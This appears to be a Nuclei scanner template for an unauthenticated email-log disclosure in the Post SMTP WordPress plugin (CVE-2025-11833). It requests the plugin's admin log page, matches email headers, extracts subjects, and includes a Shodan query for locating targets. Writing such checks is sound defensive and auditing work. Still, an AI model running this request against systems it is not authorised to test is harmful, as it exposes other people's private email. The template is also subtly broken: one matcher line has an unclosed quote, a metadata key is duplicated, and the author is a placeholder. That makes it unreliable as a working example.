id: CVE-2025-11833

info:
  name: Post SMTP < 3.6.1 - Unauthenticated Email Log Disclosure
  author: YourName
  severity: high
  description: |
    The Post SMTP plugin for WordPress before version 3.6.1 contains an unauthenticated email log disclosure vulnerability
    that allows unauthenticated attackers to view email logs containing sensitive information.
    Fixed in version 3.6.1.
  reference:
    - https://wordpress.org/plugins/post-smtp/#developers
    - https://nvd.nist.gov/vuln/detail/CVE-2025-11833
  classification:
    cve-id: CVE-2025-11833
    cwe-id: CWE-200
  tags: cve,cve2025,wordpress,post-smtp,disclosure,wp-plugin,unauth,exposure
  metadata:
    verified: true
    max-request: 2
    shodan-query: http.html:"Post SMTP"
    verified: true
    remediation: Upgrade to Post SMTP plugin version 3.6.1 or later

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-admin/admin.php?page=postman_email_log&view=log&log_id=1"
    matchers-condition: and
    matchers:
      - type: dsl
        name: Check for email headers in response
        dsl:
          - status_code == 200
          - contains_any(body, "From:", "To:", "Subject:", "Content-Type:", "Message-ID:")
          - "!contains_any(body, 'loginform', 'wp-login.php', 'do not have sufficient permissions')
          - contains(body, 'post-smtp')
      - type: word
        words:
          - "<title>Email Log #"
          - "<div class=\"wrap\">"
        condition: and
    extractors:
      - type: regex
        name: email_subject
        part: body
        group: 1
        regex:
          - '(?m)^Subject:\s*([^\r\n]+)'

  # Check for patched version (should redirect to login)
  - method: GET
    path:
      - "{{BaseURL}}/wp-admin/admin.php?page=postman_email_log&view=log&log_id=1"
    matchers:
      - type: status
        status:
          - 302
      - type: word
        words:
          - "wp-login.php"
        part: header
        condition: or
